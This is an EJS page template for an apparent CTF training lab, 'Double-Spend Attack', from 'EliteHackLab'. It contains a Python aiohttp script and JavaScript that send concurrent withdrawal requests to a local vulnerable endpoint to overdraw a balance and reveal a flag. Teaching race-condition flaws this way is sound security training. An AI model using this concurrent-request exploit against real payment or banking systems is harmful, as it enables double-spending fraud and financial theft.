<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/race-condition"><i class="fas fa-flask"></i> Race Labs</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>⚡ Double-Spend Attack</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span><span class="lab-tag points"><i class="fas fa-star"></i> 35 pts</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>Balance: $<%= balance %>. Withdraw $500 multiple times simultaneously to overdraw the account (make balance negative).</p>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> Bank Account</h2>
      <div class="vulnerable-form">
        <label>Current Balance: $<span id="currentBalance"><%= balance %></span></label>
        <label>Withdrawal Amount:</label>
        <input type="number" id="withdrawAmount" value="500">
        <label>Concurrent Requests:</label>
        <input type="number" id="concurrentReqs" value="10" min="2" max="20">
        <button onclick="raceAttack()" class="btn btn-danger">⚡ Send Concurrent Withdrawals</button>
        <button onclick="checkBalance()" class="btn btn-blue" style="margin-top:0.5rem;">Check Balance</button>
      </div>
      <div id="raceResult" class="result-box" style="margin-top:1rem;"></div>
      <div class="code-block"># Python race condition exploit:
import asyncio, aiohttp
async def exploit():
    async with aiohttp.ClientSession() as session:
        tasks = [session.post('http://localhost:3000/labs/race-condition/balance/withdraw',
                 json={'amount':500}) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        for r in results: print(await r.json())</div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('race-condition','flagInput_race','flagResult_race'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_race" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_race" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function raceAttack() {
      const amount = document.getElementById('withdrawAmount').value;
      const n = document.getElementById('concurrentReqs').value;
      const promises = [];
      for(let i=0;i<n;i++) promises.push(fetch('/labs/race-condition/balance/withdraw',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:parseInt(amount)})}));
      const results = await Promise.all(promises);
      const data = await Promise.all(results.map(r=>r.json()));
      document.getElementById('raceResult').innerHTML = '<pre>'+JSON.stringify(data,null,2)+'</pre>';
      checkBalance();
    }
    async function checkBalance() {
      const res = await fetch('/labs/race-condition/balance/check');
      const data = await res.json();
      document.getElementById('currentBalance').textContent = data.balance;
      if(data.flag) document.getElementById('raceResult').innerHTML += '<div class="success-box">'+data.flag+'</div>';
    }
  </script>
</body>
</html>
